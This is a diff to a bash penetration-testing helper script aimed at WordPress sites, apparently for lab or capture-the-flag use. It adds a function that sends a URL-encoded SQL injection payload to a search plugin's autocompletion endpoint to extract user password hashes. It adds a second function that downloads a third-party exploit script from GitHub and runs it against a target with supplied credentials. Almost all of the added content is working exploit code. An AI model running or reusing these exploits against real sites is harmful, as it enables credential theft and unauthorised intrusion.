@@ -20,7 +20,9 @@ run_wpscan() {
         echo "Using proxychains for WPScan."
     fi
     echo "Running WPScan..."
-    eval ${proxy_command}wpscan --url http://$url --enumerate p --plugins-detection aggressive | tee >(remove_color_to_log >> $wpscan_log)
+    local wpsscan_cmd="${proxy_command}wpscan --no-update --url http://$url --enumerate ap --plugins-detection aggressive"
+    echo $wpsscan_cmd
+    eval $wpsscan_cmd | tee >(remove_color_to_log >> $wpscan_log)
 }
 
 login_wp() {
@@ -148,4 +150,51 @@ run_perfect_survey_exploit() {
     url="http://$target_host/$poc"
     curl -s "$url" | sed 's/\\"/"/g' | sed 's/\\\//\//g' | grep -oP 'value="\K[^"]+' 
 
+}
+
+perform_cve_2024_9796() {
+    if [[ -z $target_url ]]; then
+        target_url=http://$ip
+        echo "Target URL is set to $target_url"
+    fi
+    if [[ -z $sql_cmd ]]; then
+        sql_cmd="wp_users UNION SELECT user_pass FROM wp_users --"
+    fi
+    local t="$sql_cmd"
+    t=$(urlencode "$t")
+    echo "$t"
+    q=admin
+    f=user_login
+    type=""
+    e=""
+    local url="$target_url/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php" 
+    curl -v "$url?q=$q&f=$f&t=$t&type=$type&e=$e" \
+        --proxy localhost:8080
+
+}
+
+perform_cve_2025_39538() {
+    local url="https://raw.githubusercontent.com/Nxploited/CVE-2025-39538/refs/heads/main/CVE-2025-39538.py"
+    local cve_dir="CVE-2025-39538"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir -p "$cve_dir"
+    fi
+    if [[ -z $target_url ]]; then
+        target_url=http://$ip
+        echo "Target URL is set to $target_url"
+    fi
+    if [[ -z $username ]]; then
+        echo "username is not set"
+        return 1
+    fi
+    if [[ -z $password ]]; then
+        echo "password is not set"
+        return 1
+    fi
+    pushd "$cve_dir" || return 1
+    if [[ ! -f CVE-2025-39538.py ]]; then
+        curl -s -o "CVE-2025-39538.py" "$url"
+    fi
+    python3 CVE-2025-39538.py -u $target_url -un $username -p $password
+    popd || return 1
 }
